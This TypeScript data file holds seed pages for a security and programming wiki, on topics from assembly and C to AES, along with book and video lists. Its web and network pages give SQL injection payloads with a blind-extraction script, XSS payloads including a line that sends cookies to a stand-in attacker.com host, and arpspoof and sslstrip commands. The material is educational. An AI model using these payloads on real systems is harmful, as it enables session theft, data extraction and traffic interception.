import type { WikiCategory } from '../types';

// Simulated wiki data - in production fetched from github.com/username/wiki-content
export const wikiCategories: WikiCategory[] = [
  {
    id: 'cybersecurity',
    name: 'Cybersecurity',
    icon: '🛡️',
    description: 'Advanced penetration testing, vulnerability research, and offensive security techniques',
    slug: 'cybersecurity',
    chapters: [
      {
        id: 'web-hacking',
        title: 'Web Application Hacking',
        slug: 'web-hacking',
        description: 'Modern web exploitation techniques',
        difficulty: 'intermediate',
        icon: '🌐',
        pages: [
          {
            id: 'sqli',
            title: 'SQL Injection Deep Dive',
            slug: 'sql-injection',
            description: 'Complete guide to SQL injection attacks and defenses',
            difficulty: 'intermediate',
            tags: ['sqli', 'web', 'database'],
            readingTime: 15,
            featured: true,
            content: `# SQL Injection Deep Dive

SQL injection remains one of the most critical web vulnerabilities. Understanding it deeply is fundamental to any security researcher.

## What is SQL Injection?

SQL injection occurs when an attacker can insert or "inject" malicious SQL code into a query that an application sends to its database.

\`\`\`sql
-- Vulnerable query
SELECT * FROM users WHERE username = '$input' AND password = '$pass'

-- Injection payload
' OR '1'='1
\`\`\`

## Types of SQL Injection

### 1. Classic/In-band SQLi

The attacker uses the same channel to launch the attack and gather results.

\`\`\`python
# Example detection script
import requests

def test_sqli(url, param):
    payloads = ["'", "''", "' OR '1'='1", "1' --"]
    for payload in payloads:
        r = requests.get(url, params={param: payload})
        if "error" in r.text.lower() or "mysql" in r.text.lower():
            return f"Possible SQLi with payload: {payload}"
    return "No obvious SQLi detected"
\`\`\`

### 2. Blind SQLi

The application doesn't return data but behaves differently based on queries.

\`\`\`python
# Boolean-based blind SQLi
import requests
import string

def extract_data_blind(url):
    result = ""
    for pos in range(1, 20):
        for char in string.printable:
            payload = f"1' AND SUBSTRING(username,{pos},1)='{char}'--"
            r = requests.get(url, params={'id': payload})
            if "Welcome" in r.text:
                result += char
                break
    return result
\`\`\`

### 3. Time-based Blind SQLi

\`\`\`sql
-- MySQL
1' AND SLEEP(5)--

-- PostgreSQL  
1'; SELECT pg_sleep(5)--

-- MSSQL
1'; WAITFOR DELAY '0:0:5'--
\`\`\`

## Defense Techniques

### Parameterized Queries (Prepared Statements)

\`\`\`python
# VULNERABLE
query = f"SELECT * FROM users WHERE name = '{user_input}'"

# SAFE - Parameterized
cursor.execute("SELECT * FROM users WHERE name = %s", (user_input,))
\`\`\`

> **Warning**: Always use parameterized queries. Never concatenate user input into SQL strings.

## Tools

- **sqlmap** - Automated SQL injection detection
- **Burp Suite** - Intercept and modify requests
- **OWASP ZAP** - Web application scanner`,
            updatedAt: '2025-01-15',
          },
          {
            id: 'xss',
            title: 'Cross-Site Scripting (XSS)',
            slug: 'xss',
            description: 'Understanding and exploiting XSS vulnerabilities',
            difficulty: 'beginner',
            tags: ['xss', 'web', 'javascript'],
            readingTime: 12,
            content: `# Cross-Site Scripting (XSS)

XSS allows attackers to inject malicious scripts into web pages viewed by other users.

## Types of XSS

### Reflected XSS
\`\`\`html
<!-- URL: https://example.com/search?q=<script>alert(1)</script> -->
<p>Results for: <script>alert(1)</script></p>
\`\`\`

### Stored XSS
\`\`\`javascript
// Malicious payload stored in database
fetch('https://attacker.com/steal?cookie=' + document.cookie)
\`\`\`

### DOM-based XSS
\`\`\`javascript
// Vulnerable code
document.innerHTML = location.hash.substring(1);

// Payload: https://example.com/#<img src=x onerror=alert(1)>
\`\`\`

## Prevention

\`\`\`python
import html

# Encode output
safe_output = html.escape(user_input)
\`\`\``,
            updatedAt: '2025-01-10',
          },
        ],
      },
      {
        id: 'network-security',
        title: 'Network Security',
        slug: 'network-security',
        difficulty: 'advanced',
        icon: '📡',
        pages: [
          {
            id: 'mitm',
            title: 'Man-in-the-Middle Attacks',
            slug: 'mitm-attacks',
            description: 'Network interception and MITM attack techniques',
            difficulty: 'advanced',
            tags: ['mitm', 'network', 'arp'],
            readingTime: 20,
            content: `# Man-in-the-Middle Attacks

MITM attacks allow an adversary to intercept and potentially alter communications between two parties.

## ARP Spoofing

\`\`\`bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP poisoning with arpspoof
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
\`\`\`

## SSL Stripping

\`\`\`bash
# Using SSLstrip
sslstrip -l 8080 &
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
\`\`\``,
            updatedAt: '2025-01-08',
          },
        ],
      },
    ],
  },
  {
    id: 'reverse-engineering',
    name: 'Reverse Engineering',
    icon: '🔬',
    description: 'Binary analysis, disassembly, decompilation, and malware analysis techniques',
    slug: 'reverse-engineering',
    chapters: [
      {
        id: 'assembly-x86',
        title: 'Assembly x86-64',
        slug: 'assembly-x86-64',
        description: 'Complete introduction to x86-64 assembly language',
        difficulty: 'intermediate',
        icon: '💻',
        pages: [
          {
            id: 'asm-basics',
            title: '0 - Basics',
            slug: 'basics',
            description: 'This file explains the basics of assembly.',
            difficulty: 'beginner',
            tags: ['assembly', 'x86', 'basics'],
            readingTime: 25,
            featured: true,
            content: `# Assembly x86-64 Basics

Assembly language is a low-level programming language that directly corresponds to machine code instructions.

## Registers

x86-64 has 16 general-purpose 64-bit registers:

| Register | Purpose |
|----------|---------|
| RAX | Accumulator, return values |
| RBX | Base register |
| RCX | Counter for loops |
| RDX | Data register |
| RSI | Source index |
| RDI | Destination index |
| RSP | Stack pointer |
| RBP | Base pointer |
| R8-R15 | Additional general purpose |

## Basic Instructions

\`\`\`asm
; Moving data
mov rax, 42        ; Load immediate value
mov rbx, rax       ; Register to register
mov [rsp], rax     ; Register to memory

; Arithmetic
add rax, rbx       ; rax = rax + rbx
sub rax, 10        ; rax = rax - 10
mul rbx            ; rdx:rax = rax * rbx
div rbx            ; rax = rdx:rax / rbx

; Stack operations
push rax           ; Decrement RSP, store RAX
pop rbx            ; Load from RSP, increment RSP

; Function call
call my_function   ; Push RIP, jump to function
ret                ; Pop RIP, return
\`\`\`

## System Calls (Linux)

\`\`\`asm
section .data
    msg db "Hello, World!", 10
    msg_len equ $ - msg

section .text
    global _start

_start:
    ; sys_write(1, msg, msg_len)
    mov rax, 1          ; syscall number (write)
    mov rdi, 1          ; file descriptor (stdout)
    mov rsi, msg        ; buffer address
    mov rdx, msg_len    ; buffer length
    syscall

    ; sys_exit(0)
    mov rax, 60         ; syscall number (exit)
    xor rdi, rdi        ; exit code 0
    syscall
\`\`\`

## Calling Convention (System V AMD64 ABI)

Arguments passed in: **RDI, RSI, RDX, RCX, R8, R9**, then stack

Return value: **RAX** (and **RDX** for 128-bit values)

Callee-saved: **RBX, RBP, R12-R15**

\`\`\`asm
; Example: int add(int a, int b)
add_func:
    push rbp
    mov rbp, rsp
    
    mov eax, edi    ; a is in edi
    add eax, esi    ; b is in esi
    ; result in eax (lower 32 bits of rax)
    
    pop rbp
    ret
\`\`\``,
            updatedAt: '2025-01-20',
          },
          {
            id: 'memory-addressing',
            title: '1 - Memory Addressing',
            slug: 'memory-addressing',
            description: 'This file explains how memory addressing works in assembly.',
            difficulty: 'beginner',
            tags: ['assembly', 'memory', 'addressing'],
            readingTime: 18,
            content: `# Memory Addressing in x86-64

Understanding memory addressing is crucial for reverse engineering and low-level programming.

## Addressing Modes

### Immediate
\`\`\`asm
mov rax, 42         ; Direct value
\`\`\`

### Register
\`\`\`asm
mov rax, rbx        ; From register
\`\`\`

### Direct Memory
\`\`\`asm
mov rax, [0x1000]   ; From absolute address
\`\`\`

### Register Indirect
\`\`\`asm
mov rax, [rbx]      ; Address stored in register
\`\`\`

### Base + Displacement
\`\`\`asm
mov rax, [rbx + 8]  ; Address + offset
mov rax, [rbp - 16] ; Stack variable
\`\`\`

### Scaled Index
\`\`\`asm
; General form: [base + index*scale + displacement]
mov rax, [rbx + rcx*8 + 4]
; Perfect for array access: arr[i] where arr is rbx, i is rcx
\`\`\`

## Stack Memory Layout

\`\`\`
High addresses
┌─────────────┐
│   Argv      │
├─────────────┤
│   Env       │
├─────────────┤
│   Stack     │ ← RSP points here (grows down)
│     ↓       │
│             │
│     ↑       │
│   Heap      │
├─────────────┤
│   BSS       │ (uninitialized globals)
├─────────────┤
│   Data      │ (initialized globals)
├─────────────┤
│   Text      │ (code)
└─────────────┘
Low addresses
\`\`\``,
            updatedAt: '2025-01-18',
          },
          {
            id: 'jumps',
            title: '2 - Jumps & Control Flow',
            slug: 'jumps',
            description: 'Understanding jumps and control flow in assembly.',
            difficulty: 'beginner',
            tags: ['assembly', 'jumps', 'control-flow'],
            readingTime: 15,
            content: `# Jumps and Control Flow

Control flow in assembly is managed through comparison and jump instructions.

## Flags Register (RFLAGS)

After arithmetic/comparison operations, flags are set:

| Flag | Name | Description |
|------|------|-------------|
| ZF | Zero Flag | Result was zero |
| SF | Sign Flag | Result was negative |
| CF | Carry Flag | Unsigned overflow |
| OF | Overflow Flag | Signed overflow |

## Comparison

\`\`\`asm
cmp rax, rbx        ; Sets flags (rax - rbx, discards result)
test rax, rax       ; Sets flags (rax AND rax, checks if zero)
\`\`\`

## Jump Instructions

\`\`\`asm
; Unconditional
jmp label           ; Always jump

; Signed comparisons
je  label           ; Jump if equal (ZF=1)
jne label           ; Jump if not equal (ZF=0)
jl  label           ; Jump if less (SF≠OF)
jle label           ; Jump if less or equal
jg  label           ; Jump if greater
jge label           ; Jump if greater or equal

; Unsigned comparisons
jb  label           ; Jump if below (CF=1)
jbe label           ; Jump if below or equal
ja  label           ; Jump if above
jae label           ; Jump if above or equal

; Special
jz  label           ; Same as je
jnz label           ; Same as jne
js  label           ; Jump if sign (negative)
jns label           ; Jump if not sign (positive)
\`\`\`

## Loop Implementation

\`\`\`asm
; for (i = 0; i < 10; i++)
    xor rcx, rcx        ; i = 0
.loop:
    cmp rcx, 10         ; i < 10?
    jge .end            ; if not, exit
    
    ; loop body here
    
    inc rcx             ; i++
    jmp .loop
.end:
\`\`\``,
            updatedAt: '2025-01-16',
          },
        ],
      },
      {
        id: 'binary-analysis',
        title: 'Binary Analysis',
        slug: 'binary-analysis',
        difficulty: 'advanced',
        icon: '🔍',
        pages: [
          {
            id: 'ghidra',
            title: 'Ghidra Fundamentals',
            slug: 'ghidra',
            description: 'Using NSA\'s Ghidra for reverse engineering',
            difficulty: 'intermediate',
            tags: ['ghidra', 'disassembly', 'decompilation'],
            readingTime: 30,
            youtube: 'https://www.youtube.com/watch?v=fTGTnrgjuGA',
            content: `# Ghidra Fundamentals

Ghidra is a free and open-source reverse engineering tool developed by the NSA.

## Installation

\`\`\`bash
# Download from https://ghidra-sre.org/
# Requires Java 17+
./ghidraRun
\`\`\`

## Key Features

- Multi-architecture disassembler
- Decompiler (C pseudocode)
- Scripting (Java/Python)
- Collaborative analysis
- Version tracking

## Basic Workflow

1. Create new project
2. Import binary
3. Analyze (auto-analysis)
4. Navigate Code Browser
5. Rename functions/variables
6. Add comments

## Scripting with Python

\`\`\`python
# Ghidra Python script example
from ghidra.program.model.listing import CodeUnit

def find_strings_xrefs():
    listing = currentProgram.getListing()
    for string_addr in findStrings(currentProgram.getMinAddress(), 
                                    currentProgram.getMaxAddress(), 
                                    4, True, True):
        print(f"String at {string_addr.address}: {string_addr}")
\`\`\``,
            updatedAt: '2025-01-12',
          },
        ],
      },
    ],
  },
  {
    id: 'programming',
    name: 'Programming',
    icon: '💻',
    description: 'Systems programming, algorithms, data structures, and language-specific guides',
    slug: 'programming',
    chapters: [
      {
        id: 'c-lang',
        title: 'C Programming',
        slug: 'c',
        description: 'Low-level systems programming in C',
        difficulty: 'intermediate',
        icon: '⚡',
        pages: [
          {
            id: 'c-pointers',
            title: 'Pointers & Memory',
            slug: 'pointers-memory',
            description: 'Deep dive into C pointers and manual memory management',
            difficulty: 'intermediate',
            tags: ['c', 'pointers', 'memory'],
            readingTime: 22,
            featured: true,
            content: `# Pointers & Memory Management in C

Understanding pointers is essential for systems programming and reverse engineering.

## Pointer Basics

\`\`\`c
int x = 42;
int *ptr = &x;    // ptr holds address of x

printf("%d\\n", x);    // 42
printf("%p\\n", ptr);  // address
printf("%d\\n", *ptr); // 42 (dereference)

*ptr = 100;           // modify through pointer
printf("%d\\n", x);   // 100
\`\`\`

## Pointer Arithmetic

\`\`\`c
int arr[] = {10, 20, 30, 40, 50};
int *ptr = arr;

printf("%d\\n", *ptr);        // 10
printf("%d\\n", *(ptr + 1));  // 20
printf("%d\\n", *(ptr + 4));  // 50

ptr++;                        // advance by sizeof(int)
printf("%d\\n", *ptr);        // 20
\`\`\`

## Dynamic Memory

\`\`\`c
#include <stdlib.h>
#include <string.h>

// Allocation
int *arr = malloc(10 * sizeof(int));
if (arr == NULL) {
    // Handle allocation failure
    return -1;
}

// Use the memory
for (int i = 0; i < 10; i++) {
    arr[i] = i * i;
}

// Always free
free(arr);
arr = NULL;  // Prevent dangling pointer

// Resizing
int *new_arr = realloc(arr, 20 * sizeof(int));
if (new_arr == NULL) {
    free(arr);  // Original still valid
    return -1;
}
arr = new_arr;
\`\`\`

## Common Memory Bugs

\`\`\`c
// Buffer overflow
char buf[8];
strcpy(buf, "this string is too long!");  // DANGER!

// Use-after-free
int *ptr = malloc(sizeof(int));
free(ptr);
*ptr = 42;  // UNDEFINED BEHAVIOR

// Memory leak
void leak() {
    int *ptr = malloc(100);
    return;  // Never freed!
}

// Double free
int *ptr = malloc(sizeof(int));
free(ptr);
free(ptr);  // UNDEFINED BEHAVIOR
\`\`\`

## Safe String Functions

\`\`\`c
// Use strncpy instead of strcpy
strncpy(dest, src, sizeof(dest) - 1);
dest[sizeof(dest) - 1] = '\\0';

// Use snprintf instead of sprintf
snprintf(buf, sizeof(buf), "Hello %s", name);
\`\`\``,
            updatedAt: '2025-01-22',
          },
        ],
      },
      {
        id: 'python-advanced',
        title: 'Advanced Python',
        slug: 'python-advanced',
        difficulty: 'intermediate',
        icon: '🐍',
        pages: [
          {
            id: 'python-async',
            title: 'Async Programming',
            slug: 'async-programming',
            description: 'Mastering asyncio and concurrent Python',
            difficulty: 'intermediate',
            tags: ['python', 'async', 'asyncio'],
            readingTime: 20,
            content: `# Async Programming in Python

Modern Python applications rely heavily on async/await for high-performance I/O.

## Basic Async/Await

\`\`\`python
import asyncio

async def fetch_data(url: str) -> dict:
    await asyncio.sleep(1)  # Simulate I/O
    return {"url": url, "data": "..."}

async def main():
    result = await fetch_data("https://api.example.com")
    print(result)

asyncio.run(main())
\`\`\`

## Concurrent Tasks

\`\`\`python
async def main():
    # Run concurrently
    tasks = [
        fetch_data("https://api1.com"),
        fetch_data("https://api2.com"),
        fetch_data("https://api3.com"),
    ]
    results = await asyncio.gather(*tasks)
    return results
\`\`\``,
            updatedAt: '2025-01-19',
          },
        ],
      },
    ],
  },
  {
    id: 'malware-analysis',
    name: 'Malware Analysis',
    icon: '🦠',
    description: 'Static and dynamic malware analysis, behavioral analysis, and threat intelligence',
    slug: 'malware-analysis',
    chapters: [
      {
        id: 'static-analysis',
        title: 'Static Analysis',
        slug: 'static-analysis',
        difficulty: 'advanced',
        icon: '🔎',
        pages: [
          {
            id: 'pe-format',
            title: 'PE File Format',
            slug: 'pe-format',
            description: 'Understanding Windows Portable Executable format',
            difficulty: 'advanced',
            tags: ['windows', 'pe', 'binary'],
            readingTime: 35,
            featured: true,
            content: `# PE (Portable Executable) File Format

The PE format is the file format used by Windows executables, DLLs, and drivers.

## PE Structure Overview

\`\`\`
┌──────────────────┐
│   DOS Header     │ MZ magic bytes
├──────────────────┤
│   DOS Stub       │ "This program cannot be run..."
├──────────────────┤
│   PE Header      │ "PE\\0\\0"
├──────────────────┤
│ Optional Header  │ Entry point, image base, etc.
├──────────────────┤
│ Section Table    │ .text, .data, .rdata, etc.
├──────────────────┤
│   .text          │ Executable code
├──────────────────┤
│   .data          │ Initialized data
├──────────────────┤
│   .rdata         │ Read-only data, imports
├──────────────────┤
│   .rsrc          │ Resources
└──────────────────┘
\`\`\`

## Parsing with Python

\`\`\`python
import pefile

pe = pefile.PE("malware.exe")

# Basic info
print(f"Machine: {pe.FILE_HEADER.Machine}")
print(f"Entry Point: {hex(pe.OPTIONAL_HEADER.AddressOfEntryPoint)}")
print(f"Image Base: {hex(pe.OPTIONAL_HEADER.ImageBase)}")

# Imports
for entry in pe.DIRECTORY_ENTRY_IMPORT:
    print(f"DLL: {entry.dll.decode()}")
    for imp in entry.imports:
        print(f"  {imp.name.decode() if imp.name else hex(imp.ordinal)}")

# Sections
for section in pe.sections:
    print(f"Section: {section.Name.decode().strip()}")
    print(f"  VA: {hex(section.VirtualAddress)}")
    print(f"  Size: {section.SizeOfRawData}")
    print(f"  Entropy: {section.get_entropy():.2f}")
\`\`\`

## Indicators of Compromise (IOCs)

Look for:
- Suspicious imports (CreateRemoteThread, VirtualAllocEx)
- High entropy sections (packed/encrypted)
- Unusual section names
- Suspicious strings (IP addresses, URLs, registry keys)`,
            updatedAt: '2025-01-25',
          },
        ],
      },
    ],
  },
  {
    id: 'linux',
    name: 'Linux & OS',
    icon: '🐧',
    description: 'Linux internals, kernel development, system administration, and hardening',
    slug: 'linux',
    chapters: [
      {
        id: 'kernel',
        title: 'Linux Kernel',
        slug: 'kernel',
        difficulty: 'advanced',
        icon: '⚙️',
        pages: [
          {
            id: 'kernel-modules',
            title: 'Kernel Modules',
            slug: 'kernel-modules',
            description: 'Writing and loading Linux kernel modules',
            difficulty: 'advanced',
            tags: ['linux', 'kernel', 'c'],
            readingTime: 28,
            content: `# Linux Kernel Modules

Kernel modules allow extending kernel functionality without rebuilding or rebooting.

## Hello World Module

\`\`\`c
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Your Name");
MODULE_DESCRIPTION("Hello World kernel module");
MODULE_VERSION("1.0");

static int __init hello_init(void) {
    printk(KERN_INFO "Hello, Kernel World!\\n");
    return 0;
}

static void __exit hello_exit(void) {
    printk(KERN_INFO "Goodbye, Kernel World!\\n");
}

module_init(hello_init);
module_exit(hello_exit);
\`\`\`

## Makefile

\`\`\`makefile
obj-m += hello.o

all:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
\`\`\`

## Loading/Unloading

\`\`\`bash
sudo insmod hello.ko     # Load module
sudo rmmod hello         # Unload module
lsmod | grep hello       # Check if loaded
dmesg | tail             # View kernel messages
\`\`\`

## Character Device Driver

\`\`\`c
#include <linux/cdev.h>
#include <linux/fs.h>

static dev_t dev_num;
static struct cdev my_cdev;

static struct file_operations fops = {
    .owner = THIS_MODULE,
    .open = device_open,
    .release = device_release,
    .read = device_read,
    .write = device_write,
};

static int __init driver_init(void) {
    alloc_chrdev_region(&dev_num, 0, 1, "mydev");
    cdev_init(&my_cdev, &fops);
    cdev_add(&my_cdev, dev_num, 1);
    return 0;
}
\`\`\``,
            updatedAt: '2025-01-23',
          },
        ],
      },
    ],
  },
  {
    id: 'cryptography',
    name: 'Cryptography',
    icon: '🔑',
    description: 'Cryptographic algorithms, protocols, attacks, and implementation',
    slug: 'cryptography',
    chapters: [
      {
        id: 'symmetric',
        title: 'Symmetric Cryptography',
        slug: 'symmetric',
        difficulty: 'intermediate',
        icon: '🔒',
        pages: [
          {
            id: 'aes',
            title: 'AES Deep Dive',
            slug: 'aes',
            description: 'Understanding AES encryption internals',
            difficulty: 'intermediate',
            tags: ['aes', 'symmetric', 'encryption'],
            readingTime: 25,
            content: `# AES (Advanced Encryption Standard)

AES is a symmetric block cipher widely used for secure data encryption.

## Key Parameters

| Parameter | Value |
|-----------|-------|
| Block size | 128 bits |
| Key sizes | 128, 192, 256 bits |
| Rounds | 10, 12, 14 |

## AES Operations

Each round consists of:
1. **SubBytes** - S-box substitution
2. **ShiftRows** - Row circular shift
3. **MixColumns** - Column mixing (not in final round)
4. **AddRoundKey** - XOR with round key

## Python Implementation

\`\`\`python
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import base64

def encrypt(plaintext: bytes, key: bytes) -> bytes:
    cipher = AES.new(key, AES.MODE_GCM)
    ciphertext, tag = cipher.encrypt_and_digest(plaintext)
    return cipher.nonce + tag + ciphertext

def decrypt(ciphertext: bytes, key: bytes) -> bytes:
    nonce = ciphertext[:16]
    tag = ciphertext[16:32]
    data = ciphertext[32:]
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    return cipher.decrypt_and_verify(data, tag)

# Usage
key = get_random_bytes(32)  # AES-256
encrypted = encrypt(b"Secret message", key)
decrypted = decrypt(encrypted, key)
\`\`\`

## Common Mistakes

\`\`\`python
# WRONG - ECB mode (patterns visible)
cipher = AES.new(key, AES.MODE_ECB)

# WRONG - Reusing nonce/IV
nonce = b'\\x00' * 16  # Static nonce!

# CORRECT - GCM with random nonce + authentication
cipher = AES.new(key, AES.MODE_GCM)  # Auto-generates random nonce
\`\`\``,
            updatedAt: '2025-01-21',
          },
        ],
      },
    ],
  },
];

export const wikiBooks = [
  {
    id: 'intel-manual',
    title: "Intel® 64 and IA-32 Architectures Software Developer's Manual",
    author: 'Intel Corporation',
    category: 'reverse-engineering',
    size: '24.8 MB',
    url: '/books/intel_manual.pdf',
    thumbnail: '📖',
    description: 'Complete reference for x86/x86-64 instruction set architecture',
    tags: ['assembly', 'x86', 'intel', 'reference'],
  },
  {
    id: 'hacker-handbook',
    title: 'The Web Application Hacker\'s Handbook',
    author: 'Stuttard & Pinto',
    category: 'cybersecurity',
    size: '8.2 MB',
    url: '/books/wahh.pdf',
    thumbnail: '📕',
    description: 'Comprehensive guide to web application security testing',
    tags: ['web', 'hacking', 'security'],
  },
  {
    id: 'practical-re',
    title: 'Practical Reverse Engineering',
    author: 'Dang, Gazet, Bachaalany',
    category: 'reverse-engineering',
    size: '11.4 MB',
    url: '/books/practical_re.pdf',
    thumbnail: '📗',
    description: 'x86, x64, ARM, Windows Kernel, reversing tools',
    tags: ['reverse-engineering', 'x86', 'windows'],
  },
  {
    id: 'art-exploitation',
    title: 'Hacking: The Art of Exploitation',
    author: 'Jon Erickson',
    category: 'cybersecurity',
    size: '5.6 MB',
    url: '/books/hacking_art.pdf',
    thumbnail: '📘',
    description: 'Deep dive into shellcode, buffer overflows, and exploitation techniques',
    tags: ['exploitation', 'shellcode', 'assembly'],
  },
];

export const wikiVideos = [
  {
    id: 'asm-basics-yt',
    title: 'Assembly x86-64 Basics - Complete Course',
    youtube: 'https://www.youtube.com/watch?v=VQAKkuLL31g',
    difficulty: 'beginner',
    duration: '4h 20min',
    category: 'reverse-engineering',
    chapter: 'assembly-x86-64',
    thumbnail: 'https://img.youtube.com/vi/VQAKkuLL31g/maxresdefault.jpg',
  },
  {
    id: 'ghidra-yt',
    title: 'Ghidra Tutorial for Beginners',
    youtube: 'https://www.youtube.com/watch?v=fTGTnrgjuGA',
    difficulty: 'beginner',
    duration: '1h 15min',
    category: 'reverse-engineering',
    chapter: 'binary-analysis',
    thumbnail: 'https://img.youtube.com/vi/fTGTnrgjuGA/maxresdefault.jpg',
  },
  {
    id: 'sqli-yt',
    title: 'SQL Injection Full Course',
    youtube: 'https://www.youtube.com/watch?v=2OPVViV-GQk',
    difficulty: 'intermediate',
    duration: '2h 45min',
    category: 'cybersecurity',
    chapter: 'web-hacking',
    thumbnail: 'https://img.youtube.com/vi/2OPVViV-GQk/maxresdefault.jpg',
  },
  {
    id: 'kernel-yt',
    title: 'Linux Kernel Module Programming',
    youtube: 'https://www.youtube.com/watch?v=juGNPLdjLH4',
    difficulty: 'advanced',
    duration: '3h 10min',
    category: 'linux',
    chapter: 'kernel',
    thumbnail: 'https://img.youtube.com/vi/juGNPLdjLH4/maxresdefault.jpg',
  },
];
